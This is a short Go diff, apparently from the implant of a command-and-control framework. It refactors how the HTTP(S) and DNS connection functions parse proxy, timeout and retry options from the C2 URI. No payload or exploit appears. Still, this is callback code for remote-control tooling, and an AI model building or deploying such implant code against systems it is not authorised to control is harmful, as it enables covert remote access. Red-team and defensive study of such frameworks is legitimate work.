@@ -428,9 +428,8 @@ func httpConnect(c2URI *url.URL) (*Connection, error) {
 	// {{if .Config.Debug}}
 	log.Printf("Connecting -> http(s)://%s", c2URI.Host)
 	// {{end}}
-	proxyConfig := c2URI.Query().Get("proxy")
-	timeout := GetPollTimeout()
-	client, err := httpclient.HTTPStartSession(c2URI.Host, c2URI.Path, timeout, proxyConfig)
+	opts := httpclient.ParseHTTPOptions(c2URI)
+	client, err := httpclient.HTTPStartSession(c2URI.Host, c2URI.Path, opts)
 	if err != nil {
 		// {{if .Config.Debug}}
 		log.Printf("http(s) connection error %v", err)
@@ -533,9 +532,8 @@ func dnsConnect(uri *url.URL) (*Connection, error) {
 	// {{if .Config.Debug}}
 	log.Printf("Attempting to connect via DNS via parent: %s\n", dnsParent)
 	// {{end}}
-	dnsTimeout := time.Duration(10 * time.Second)
-	retry := time.Duration(time.Millisecond * 100) // TODO: make configurable
-	client, err := dnsclient.DNSStartSession(dnsParent, retry, dnsTimeout)
+	opts := dnsclient.ParseDNSOptions(uri)
+	client, err := dnsclient.DNSStartSession(dnsParent, opts)
 	if err != nil {
 		return nil, err
 	}
